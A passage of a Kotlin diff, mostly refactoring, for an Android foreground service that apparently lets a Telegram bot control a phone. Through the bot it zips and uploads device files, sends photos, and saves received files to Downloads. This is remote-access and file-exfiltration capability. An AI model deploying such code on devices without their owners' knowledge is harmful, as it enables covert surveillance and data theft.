                 sendMessage(chatId, "${dp()}⬆️ Uploading $cap… $pct%")
                 val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chatId)
-                    .addFormDataPart("document", zipFile.name, zipFile.readBytes().toRequestBody("application/zip".toMediaTypeOrNull()))
+                    .addFormDataPart("document", zipFile.name,
+                        zipFile.readBytes().toRequestBody("application/zip".toMediaTypeOrNull()))
                     .addFormDataPart("caption", cap).build()
                 httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                     if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Upload failed part ${idx + 1}: ${r.code}")
                 }
-            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error part ${idx + 1}: ${e.message}") }
+            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ ZIP error part ${idx + 1}: ${e.message}") }
             finally { try { zipFile.delete() } catch (_: Exception) {} }
         }
         if (total > 1) sendMessage(chatId, "${dp()}✅ All $total ZIP parts sent!")
@@ -1003,28 +1065,28 @@ ${dp()}🤖 *All Commands*
     //  INCOMING DOCUMENT FROM USER
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleIncomingDocument(chatId: String, fileObj: JSONObject, fallbackName: String = "received_${System.currentTimeMillis()}") {
+    private suspend fun handleIncomingDoc(chatId: String, fileObj: JSONObject,
+                                          fallback: String = "received_${System.currentTimeMillis()}") {
         val fileId   = fileObj.optString("file_id").ifEmpty { sendMessage(chatId, "${dp()}⚠️ No file_id."); return }
-        val fileName = fileObj.optString("file_name").ifEmpty { fallbackName }
-        sendMessage(chatId, "${dp()}💾 Saving *$fileName*…\n⏳ Please wait | 0%", "Markdown")
-        serviceScope.launch {
-            try {
-                val path = getTelegramFilePath(fileId) ?: run { sendMessage(chatId, "${dp()}❌ Cannot resolve file."); return@launch }
-                sendMessage(chatId, "${dp()}⬇️ Downloading… 50%")
-                val bytes = httpClient.newCall(Request.Builder().url("$BASE_FILE_URL/$path").get().build()).execute().use { r ->
-                    if (!r.isSuccessful) { sendMessage(chatId, "${dp()}❌ Download failed: ${r.code}"); return@launch }
-                    r.body?.bytes() ?: run { sendMessage(chatId, "${dp()}❌ Empty."); return@launch }
+        val fileName = fileObj.optString("file_name").ifEmpty { fallback }
+        sendMessage(chatId, "${dp()}💾 Saving *$fileName*… | 0%", "Markdown")
+        try {
+            val path = getTgFilePath(fileId) ?: run { sendMessage(chatId, "${dp()}❌ Cannot resolve file."); return }
+            sendMessage(chatId, "${dp()}⬇️ Downloading… 50%")
+            val bytes = httpClient.newCall(Request.Builder().url("$BASE_FILE_URL/$path").get().build())
+                .execute().use { r ->
+                    if (!r.isSuccessful) { sendMessage(chatId, "${dp()}❌ Download failed: ${r.code}"); return }
+                    r.body?.bytes() ?: run { sendMessage(chatId, "${dp()}❌ Empty."); return }
                 }
-                val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(fileName.substringAfterLast('.', ""))
-                    ?: "application/octet-stream"
-                if (saveToDownloads(fileName, mime, bytes))
-                    sendMessage(chatId, "${dp()}✅ *$fileName* saved to Downloads.", "Markdown")
-                else sendMessage(chatId, "${dp()}❌ Failed to write file.")
-            } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error: ${e.message}") }
-        }
+            val mime = MimeTypeMap.getSingleton()
+                .getMimeTypeFromExtension(fileName.substringAfterLast('.', "")) ?: "application/octet-stream"
+            if (saveToDownloads(fileName, mime, bytes))
+                sendMessage(chatId, "${dp()}✅ *$fileName* saved to Downloads.", "Markdown")
+            else sendMessage(chatId, "${dp()}❌ Failed to save file.")
+        } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Error: ${e.message}") }
     }
 
-    private fun getTelegramFilePath(fileId: String): String? {
+    private fun getTgFilePath(fileId: String): String? {
         return try {
             val body = httpClient.newCall(Request.Builder().url("$URL_GET_FILE?file_id=$fileId").get().build())
                 .execute().use { it.body?.string() } ?: return null
@@ -1060,17 +1122,15 @@ ${dp()}🤖 *All Commands*
     //  HELPERS
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun hasPermission(perm: String) =
-        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
+    private fun hasPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
 
     private fun resolveFolder(root: File, path: String): File? {
         val direct = File(root, path)
         if (direct.exists() && direct.isDirectory) return direct
         var cur = root
         for (seg in path.split("/")) {
-            cur = cur.listFiles()?.firstOrNull {
-                it.name.lowercase() == seg.lowercase() && it.isDirectory
-            } ?: return null
+            cur = cur.listFiles()?.firstOrNull { it.name.lowercase() == seg.lowercase() && it.isDirectory }
+                ?: return null
         }
         return cur
     }
@@ -1084,11 +1144,6 @@ ${dp()}🤖 *All Commands*
         bytes >= 1_048_576L     -> "${"%.1f".format(bytes / 1_048_576.0)} MB"
         bytes >= 1_024L         -> "${"%.1f".format(bytes / 1_024.0)} KB"
         else                    -> "$bytes B"
-    }
-
-    private fun formatAgo(ms: Long): String {
-        val s = ms / 1000
-        return when { s < 60 -> "${s}s ago"; s < 3600 -> "${s / 60}m ago"; else -> "${s / 3600}h ago" }
     }
 
     private fun startForegroundWithNotification() {
@@ -1108,19 +1163,20 @@ ${dp()}🤖 *All Commands*
                 put("chat_id", chatId); put("text", text)
                 if (parseMode != null) put("parse_mode", parseMode)
             }
-            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
-            httpClient.newCall(Request.Builder().url(URL_SEND_MSG).post(body).build()).execute().use {}
-        } catch (e: Exception) { Log.e(TAG, "sendMessage: ${e.message}") }
+            httpClient.newCall(Request.Builder().url(URL_SEND_MSG)
+                .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull())).build())
+                .execute().use {}
+        } catch (e: Exception) { Log.e(TAG, "sendMsg: ${e.message}") }
     }
 
-    private fun sendPhotoWithCaption(chatId: String, file: File, caption: String) {
+    private fun sendPhoto(chatId: String, file: File, caption: String) {
         try {
             val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", chatId)
                 .addFormDataPart("caption", caption)
                 .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull())).build()
             httpClient.newCall(Request.Builder().url(URL_SEND_PHOTO).post(body).build()).execute().use { r ->
-                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Photo upload failed: ${r.code}")
+                if (!r.isSuccessful) sendMessage(chatId, "${dp()}❌ Photo failed: ${r.code}")
             }
         } catch (e: Exception) { sendMessage(chatId, "${dp()}❌ Photo error: ${e.message}") }
     }
